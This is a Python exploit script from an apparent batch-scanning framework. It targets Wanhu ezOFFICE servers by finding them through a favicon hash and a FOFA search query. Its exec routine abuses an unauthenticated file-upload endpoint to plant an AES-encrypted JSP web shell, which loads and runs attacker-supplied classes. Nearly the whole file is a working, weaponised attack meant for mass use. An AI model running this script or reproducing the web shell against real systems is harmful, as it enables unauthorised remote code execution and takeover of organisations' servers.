# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-07 21:20

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: "app=\"万户网络-ezOFFICE\" && country=\"CN\""
# python3 batch.py -m exploit.scripts.OA.Wanhu.unauth_uploadfile -cs -fs "app=\"万户网络-ezOFFICE\" && country=\"CN\""

class Script(BaseScript):
    name = 'WanHu'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/favicon.ico']
        # exec
        self.exec_path_list = ['/defaultroot/upload/fileUpload.controller']
        # 相关信息
        self.info = ''
        # favicon
        self.favicon_md5_list = ['fa1f01d0392d60663d8ce936fe06096a']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if favicon_md5 in self.favicon_md5_list:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0', 'Connection': 'Keep-Alive'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*......tas9er*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if '''"result":"success"''' in text:
                    # /defaultroot/upload/html/{random}.txt
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
